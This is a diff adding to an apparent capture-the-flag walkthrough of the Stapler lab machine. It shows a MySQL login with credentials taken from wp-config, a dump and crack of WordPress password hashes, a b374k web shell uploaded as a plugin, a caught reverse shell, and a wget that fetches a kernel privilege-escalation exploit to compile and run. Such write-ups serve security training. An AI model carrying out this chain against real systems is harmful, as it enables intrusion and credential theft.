@@ -82,3 +82,65 @@ So to be able to read the content lets download it with curl:
 ![](images/StaplerPics/11_wp_conf_dl.png)
 
 MYSQL credentials: **root:plbkac**
+
+Connect to the target on port 3306 mysql:
+
+```
+mysql --user=root --password=plbkac -h 10.0.0.142
+```
+
+The databases on the target:
+
+![](images/StaplerPics/12_databases.png)
+
+```
+use wordpress;
+```
+
+```
+show tables;
+```
+![](images/StaplerPics/12_1_wp_tables.png)
+
+```
+select * from wp_users;
+```
+![](images/StaplerPics/13_wp_users.png)
+
+Ok now we have the hashes of all users on the wordpress blog. It's time to crack
+them. After a while we got the admin account of john:
+
+![](images/StaplerPics/14_john.png)
+
+![](images/StaplerPics/15_web_admin.png)
+
+We can't install plugin on the wp blog because we need ftp credentials.
+
+![](images/StaplerPics/16_cant_upload.png)
+
+Despite the error and the fact we haven't the ftp credentials of john our atempt
+to upload b374k shell as plugin ended up uploaded in the media dir:
+
+![](images/StaplerPics/17_media.png)
+
+Now we have shell access to the target:
+
+![](images/StaplerPics/18_shell.png)
+
+Start reverse shell from b374k to our attacker machine:
+
+![](images/StaplerPics/19_start_reverse_shell.png)
+
+Catch the reverse shell and find out whoami and operation system version:
+
+![](images/StaplerPics/20_catch_shell.png)
+
+For ubuntu 16.04 there is privelege escalation exploit:
+
+```
+wget https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
+```
+
+After compile and execute the exploit:
+
+![](images/StaplerPics/21_flag.png)
